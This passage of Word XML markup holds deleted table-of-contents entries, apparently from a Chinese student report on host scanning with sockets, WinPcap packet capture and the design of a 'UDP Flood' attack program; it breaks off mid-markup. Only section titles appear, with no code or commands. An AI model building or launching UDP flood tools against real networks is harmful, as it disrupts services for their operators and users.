    <w:p w14:paraId="057B7788" w14:textId="3412FF31" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="663" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="664" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="665" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.3.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="666" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>Socket</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="667" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>网络编程技术主机扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>10</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6CA55AAB" w14:textId="79C9BD08" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="668" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="669" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="670" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="671" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>WinPcap</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="672" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>简介及原理</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>10</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1E945027" w14:textId="14F324DD" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="673" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="674" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="675" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.4.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="676" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>WinPcap</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="677" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>简介</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>10</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3AD3AFBA" w14:textId="629A1999" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="678" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="679" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="680" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.4.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="681" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>基于</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="682" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>WindPcap</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="683" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>可以开发的网络应用程序</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>10</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="660937F4" w14:textId="259EACE6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="684" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="685" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="686" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.4.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="687" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>基于</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="688" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>WindPcap</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="689" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>中主要函数的功能</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>11</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0AB46D20" w14:textId="21607373" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="690" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="691" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="692" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.4.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="693" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>WinPcap</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="694" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>实现数据包捕获与分析的流程</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>11</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="46CB242A" w14:textId="378B7D57" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="695" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="696" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="697" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.5</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="698" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>本章小结</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>12</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7A373A4B" w14:textId="53DBD6DD" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="699" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="700" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="701" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="702" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>概要设计</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>13</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="33C443B0" w14:textId="3489B1DD" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="703" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="704" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="705" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="706" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>设计初衷</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>13</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B6574E8" w14:textId="62C3C667" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="707" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="708" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="709" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>3.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="710" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="711" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击程序的</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="712" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>目标</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>13</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E42A413" w14:textId="277A0FBF" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="713" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
